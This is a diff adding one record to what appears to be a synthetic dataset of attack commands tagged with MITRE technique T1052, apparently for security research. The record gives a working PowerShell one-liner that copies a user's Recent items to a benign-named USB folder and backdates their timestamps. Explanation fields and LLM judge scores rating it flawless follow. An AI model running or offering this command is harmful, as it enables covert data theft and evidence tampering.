@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $dst=Join-Path $usb 'System Logs'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; Copy-Item \"C:\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*\" -Destination $dst -Force -ErrorAction SilentlyContinue; Get-ChildItem $dst -Recurse | ForEach-Object { $_.CreationTime=(Get-Date).AddYears(-3); $_.LastWriteTime=$_.CreationTime }",
+  "explanation": "Copies Recent items to a benign-looking folder on USB using Copy-Item and then timestomps them to appear old, reducing scrutiny.",
+  "rationale_steps": [
+    "Determine removable drive letter",
+    "Create innocuous destination folder",
+    "Copy recent file references via Copy-Item",
+    "Adjust timestamps to blend with older data"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-ef16fd52",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell pipeline is well-formed with balanced quotes and parentheses, valid cmdlets/parameters, and proper use of separators.",
+        "semantic_score": 5,
+        "semantic_justification": "It locates a removable drive, creates a benign-named folder, copies Recent items to it, and timestomps them, aligning with T1052 exfiltration to physical media and evasion tactics.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T06:54:24.082576Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper variable assignments, pipeline operations, error handling with SilentlyContinue, balanced quotes/parentheses/braces, and appropriate PowerShell cmdlets and parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by automatically detecting a USB drive, creating a deceptively named folder ('System Logs'), copying user's Recent items to it, and using timestamp manipulation to reduce detection - all core components of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T06:54:28.071880Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes and parentheses, proper command separators, and valid cmdlet parameters.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly achieves its claimed intent by finding a USB drive, creating a benign-looking directory, copying user 'Recent' items, and effectively timestomping them to appear old, all aligning perfectly with T1052 exfiltration and evasion tactics.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:54:39.413031Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
